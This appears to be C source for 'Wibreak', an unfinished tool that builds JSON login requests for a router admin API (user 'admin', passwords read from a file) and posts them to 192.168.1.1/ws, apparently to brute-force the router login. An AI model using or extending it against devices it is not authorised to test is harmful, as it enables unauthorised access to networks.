// Local include
#include "../header/function.h"

void print_usage(){
    printf("Usage : ./Wibreak -u url -t filename\n");
}


/**
 * Create the Json payload for query
 * @param password
 * @return json_string
 */
char *init_payload(char *password) {
    cJSON *root = NULL;
    cJSON *child = NULL;
    cJSON *json_data = NULL;
    char *json = NULL;

    // Create JSON object
    root = cJSON_CreateObject();
    child = cJSON_CreateObject();

    // Check for errors in the creation
    if (!root || !child) {
        fprintf(stderr, "Error: cJSON_CreateObject failed.\n");
        goto cleanup;
    }

    // Setup json data
    cJSON_AddStringToObject(root, "service", "sah.Device.Information");
    cJSON_AddStringToObject(root, "method", "createContext");

    cJSON_AddStringToObject(child, "applicationName", "webui");
    cJSON_AddStringToObject(child, "username", "admin");
    cJSON_AddStringToObject(child, "password", password);

    // Link child to root
    cJSON_AddItemToObject(root, "parameters", child);

    // Format to strings
    json = cJSON_PrintUnformatted(root);
    if (!json)
        goto cleanup;
    else
        // printf("Json data : %s\n", json);
        // cJSON_Delete(child);
        cJSON_Delete(root);

    return json;
cleanup:
    cJSON_Delete(root);
    free(json);
    printf("ERROR 128\n");
    return "ERROR 128";
}

/* ---------------------------------------------------------------- */
/* TODO:
1. Take url from arg
2. Take password from file
*/
int make_query(char *json_payload) {
    int http_code = 0;
    CURL *curl = NULL;
    struct curl_slist *headers = NULL;

    curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "Init failed\n");
        return EXIT_FAILURE;
    }

    // Set option
    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "POST");
    curl_easy_setopt(curl, CURLOPT_URL, "192.168.1.1/ws");
    headers = curl_slist_append(headers, "Authorization: X-Sah-Login");
    headers = curl_slist_append(
        headers, "content-type: application/x-sah-ws-4-call+json");

    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_payload);

    // perform out action
    curl_easy_perform(curl);

    // Get http code
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

    // Close socket i guess
    curl_easy_cleanup(curl);
    return http_code;
}

FILE *init_file(char *filename) {
    FILE *fp;
    char *line = NULL;
    size_t len = 0;
    ssize_t read;

    fp = fopen(filename, "r");
    if (fp == NULL) exit(EXIT_FAILURE);
    return fp;
}